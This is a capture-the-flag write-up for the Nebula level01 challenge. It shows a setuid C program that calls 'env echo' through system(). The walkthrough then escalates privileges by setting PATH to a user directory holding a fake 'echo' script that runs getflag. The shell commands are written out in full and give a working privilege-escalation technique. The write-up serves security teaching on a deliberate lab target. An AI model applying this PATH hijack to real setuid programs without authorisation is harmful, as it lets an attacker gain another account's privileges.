## Challenge
There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

## Solution
This is the source code for `/home/flag01/flag01`
```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
```
Note the executable has a setuid bit.
```shell
level01@nebula:/home/flag01$ ls -l
total 8
-rwsr-x--- 1 flag01 level01 7322 2011-11-20 21:22 flag01
```
This is the interesting line in the source code.
```c
system("/usr/bin/env echo and now what?");
```
Notice how `/usr/bin/env` is called using it's full path, as opposed to `echo`.

We can exploit this fact to execute a `search-order-hijack` attack.

When an executable is mentioned without full path the system will search
the directories listed in the `PATH` environment variable for it.
```shell
level01@nebula:/home/flag01$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
```
We can use `env` to set the variable to a directory of our choosing.
```shell
level01@nebula:/home/flag01$ env PATH=/home/level01 ./flag01
/usr/bin/env: echo: No such file or directory
```
Now create a file to replace echo, this file will execute `getflag`
```shell
level01@nebula:/home/flag01$ whereis getflag
getflag: /bin/getflag
level01@nebula:/home/flag01$ echo "/bin/getflag" > /home/level01/echo; chmod 777 /home/level01/echo
```
And run `flag01` again.
```shell
level01@nebula:/home/flag01$ env PATH=/home/level01 ./flag01
You have successfully executed getflag on a target account
```
